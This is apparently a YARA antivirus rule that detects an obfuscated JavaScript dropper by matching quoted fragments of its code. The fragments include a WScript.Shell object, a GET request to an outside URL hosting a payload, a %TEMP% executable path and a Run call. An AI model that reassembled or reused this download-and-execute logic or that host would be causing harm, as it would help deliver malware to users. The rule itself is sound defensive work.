rule sig_20160328_026e606ebf8eb7c3a435831cf1f945ba {
  meta:
    description = "datamaliciousorder - file 20160328_026e606ebf8eb7c3a435831cf1f945ba.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "163f792ec6de0b7fbd145c03ede40056eb9d07d90358d7e49975b839a5829713"

  strings:
    $s1  = "function Ibywki() {return Evdkkol[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"YWqMF69vt.exe\";};" fullword ascii
    $s2  = "Elklwjw[Sldvzyav](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Oelikyomw](Ksovsjkb() * 11)} while (Elklwjw[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Isucw(Ynvkoxpe, Cylsi){return Ynvkoxpe - Cylsi;};" fullword ascii
    $s5  = "var Evdkkol = function Liuymwlj() {return WScript[Ujouuexhs](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Inwrmtuwft(Yirhyjqqxv){Evdkkol[\"Run\"](Yirhyjqqxv, Zaxwom, Zaxwom);};" fullword ascii
    $s7  = "var Fswadjuyx = false;" fullword ascii
    $s8  = "function Dzaxk(Ujgmzxzv) {var Qyzmuwcq = (1, 2, 3, 4, 5, Ujgmzxzv); return Qyzmuwcq;};" fullword ascii
    $s9  = "Uhyvjrk = true; " fullword ascii
    $s10 = " while (Bcfpttfjx){" fullword ascii
    $s11 = "function Dscezrk()" fullword ascii
    $s12 = "function Ksovsjkb(){return 22;};" fullword ascii
    $s13 = "var Uhyvjrk = false;" fullword ascii
    $s14 = "var Kvydkl = false;" fullword ascii
    $s15 = "Kvydkl = true; " fullword ascii
    $s16 = "return Isucw(Fbwcbfkv, Yldhzzba);" fullword ascii
    $s17 = "function Qquttai(){return Ujouuexhs;};" fullword ascii
    $s18 = "var Lauhnk = new this[\"Date\"]();" fullword ascii
    $s19 = "function Xloejic(){return Ytyhvfhtvx;};" fullword ascii
    $s20 = "function Oueyca() {return ((Kvydkl == true) && (Kvydkl == Uhyvjrk)) ? 1 : Zaxwom;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}